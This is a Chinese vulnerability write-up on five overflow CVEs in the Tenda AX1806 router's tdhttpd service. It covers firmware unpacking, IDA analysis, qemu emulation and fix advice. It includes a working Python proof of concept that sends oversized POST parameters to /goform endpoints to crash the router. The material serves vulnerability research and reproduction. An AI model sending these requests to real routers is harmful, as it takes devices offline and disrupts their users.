Tenda AX1806路由器固件版本 v1.0.0.1，存在多处栈溢出漏洞，漏洞点在 tdhttpd 二进制文件中，使用了危险函数 strcpy 前未对参数长度进行判断，导致拒绝服务漏洞。

0x01 CVE信息
==========

通过公布的漏洞编号，得知CVE编号为 CVE-2022-28971、CVE-2022-28972、CVE-2022-28970、CVE-2022-28969、CVE-2022-28973。在CVE网站中查询相关信息，得到漏洞相关信息，基本上都是溢出类漏洞：

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-678f4ed0eb472f9ff333332f4c0207eeab053422.png)

0x02 漏洞分析
=========

在官网下载固件（下载链接在文末），使用 binwalk 解包固件（需要用到ubi\_reader），得到 ubifs 文件系统：

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-524e093ac5f0a0355769bc7b2566e50d2e592006.png)

查询收集CVE信息，得知漏洞点在于 fromAdvSetMacMtuWan 、form\_fast\_setting\_wifi\_set、fromSetIpMacBind、GetParentControlInfo、fromSetWifiGusetBasic 函数中。对于这种路由器系统来说，路由器一般都是通过 httpd 服务来运行路由器管理页面，用户在修改路由器配置时直接在管理页面上提交数据，交给 httpd 服务程序处理，所以可以在固件系统中查找 httpd 相关文件然后分析。使用 grep -r httpd . 命令在 ./bin 文件夹下查找到一个 tdhttpd 可执行程序：

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-a7f1df9f2dfb9d1c9cc29398b71ca966ea6e90c5.png)

将 tdhttpd 放入IDA查看，ARM 32位小端，文件没有去掉符号，很容易分析。接下来分析上面提到的几个漏洞函数。fromAdvSetMacMtuWan 内调用函数 sub\_658D8，sub\_658D8 内字符串拷贝前未对输入参数做长度判断：

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-39eac1e643487c3b197247f33a1b36a3eaf87556.png)

form\_fast\_setting\_wifi\_set 函数在处理 timeZone 参数时未对长度进行判断：

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-4c6f032f8f42e8ea509e0c31b4d144c91930ad5e.png)

fromSetIpMacBind 就更离谱了，未对长度进行判断，无论如何都将内容拷贝到v20变量中：

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-9b59e542088b51bd7312193cf226c6f9c632cafb.png)

GetParentControlInfo 函数在拷贝到堆块时未对长度进行判断，导致堆溢出：

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-24cd62f150256405e16decb734c110d0c275d28d.png)

fromSetWifiGusetBasic 函数也是没有判断参数长度直接进行拷贝：

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-8276b7779ded3f06373fa995d44ccd6622ab9675.png)

0x03 动态调试
=========

使用 sudo qemu-arm-static -L . ./bin/tdhttpd 模拟运行固件，运行时监听了80端口，但无法访问页面：

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-6e04594d34ae2c90df19263cfca7e73d8982cc21.png)

这个是因为IP地址不对，可以另起一个终端查看80端口的IP地址：

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-d5650e25d3de9ca1e5eaf7a0c2e2fbee9d8ddf7b.png)

这时候需要新建一个网桥：

sudo apt install uml-utilities bridge-utils  
sudo brctl addbr br0  
sudo brctl addif br0 ens33  
sudo ifconfig br0 up  
sudo dhclient br0

新建网桥后除了本地网卡 ens33 以外多了一个 br0 网卡：

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-6ce3976881a7524a8ee6cfe6858c97c7b08a7c0a.png)

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-b403409be4e82e98f2f0db62a7d3f5e74997bf47.png)

然后安装 arm 环境的 libc，把 qemu-arm-static 拷贝到固件根文件夹下，再次运行 httpd 服务，就可以模拟成功并访问页面了：

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-2bb404ee326bceb904bfbcd9edd32faefddbe590.png)  
sudo apt install qemu-user-static libc6-arm\* libc6-dev-arm\*  
cp $(which qemu-arm-static) .  
sudo chroot ./ ./qemu-arm-static ./bin/tdhttpd

虽然能模拟部分页面，但是 Wi-Fi 功能是不能用的，因为 Wi-Fi 功能需要独立的硬件来支持，所以如果要测试 Wi-Fi 功能相关的接口，还是需要购买路由器才行。由于我是纯模拟，没有购买路由器，所以测试接口的时候参考了公布的PoC代码，这里模拟固件只是方便复现调试。Poc代码如下：

import requests

def CVE\_2022\_28970():  
 data \\= {  
 b"mac": b"A"\*0x400  
 }  
 res \\= requests.post("<http://172.16.96.20/goform/GetParentControlInfo>", data\\=data)  
 print(res.content)

def CVE\_2022\_28973():  
 data \\= {  
 b"wanMTU": b'A'\*0x800,  
 }  
 res \\= requests.post("<http://172.16.96.20/goform/AdvSetMacMtuWan>", data\\=data)  
 print(res.content)

def CVE\_2022\_28969():  
 data \\= {  
 b"shareSpeed": b'A'\*0x800  
 }  
 res \\= requests.post("<http://172.16.96.20/goform/WifiGuestSet>", data\\=data)  
 print(res.content)

def CVE\_2022\_28971():  
 data \\= {  
 b"list": b'A'\*0x800,  
 b"bindnum": b"1"  
 }  
 res \\= requests.post("<http://172.16.96.20/goform/SetIpMacBind>", data\\=data)  
 print(res.content)

def CVE\_2022\_28972():  
 data \\= {  
 b"ssid": b'A',  
 b"timeZone": payload.ljust(0x100,b'A') + b":" + b"A"\*0x400  
 }  
 res \\= requests.post("[http://172.16.96.20/goform/fast\\\_setting\\\_wifi\\\_set](http://172.16.96.20/goform/fast%5C_setting%5C_wifi%5C_set)", data\\=data)  
 print(res.content)

CVE\_2022\_28971()

可以使用 gdb-multiarch 来动态调试Poc，只需要在qemu运行时加上调试参数。qemu运行命令如下：

sudo chroot ./ ./qemu-arm-static ./bin/tdhttpd

调试脚本如下：

gdb-multiarch \\\\ -ex "target remote :1234" \\\\  
 -ex "python set\_arch(\\\\"arm\\\\")" \\\\  
 -ex "b \*($1)" \\\\

执行Poc，因为栈中返回地址被覆盖，最后会返回段错误信息，qemu 崩溃退出。但如果在实际过程中，路由器就已经宕机了：

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-2b9b52aeca00d509c305c65f7cd3d5dbb8598d59.png)

因为是 strcpy 对字符串进行拷贝，遇到空字符会截断，所以无法构造地址进行利用，只能达到拒绝服务的攻击目的。

0x04 漏洞修复思路
===========

总结下来就是使用危险函数 strcpy 前未对参数进行长度判断，导致栈溢出。可将 strcpy 函数替换为 strncpy 函数控制拷贝字符长度，或者在使用 strcpy 前对长度进行判断。

0x05 Reference
==============

[AX1806 升级软件\_腾达(Tenda)官方网站](https://www.tenda.com.cn/download/detail-3306.html)

[IoT-vuln/Tenda/AX1806 at main · d1tto/IoT-vuln](https://github.com/d1tto/IoT-vuln/tree/main/Tenda/AX1806)

[写给初学者的IoT实战教程之ARM栈溢出](https://www.anquanke.com/post/id/204326)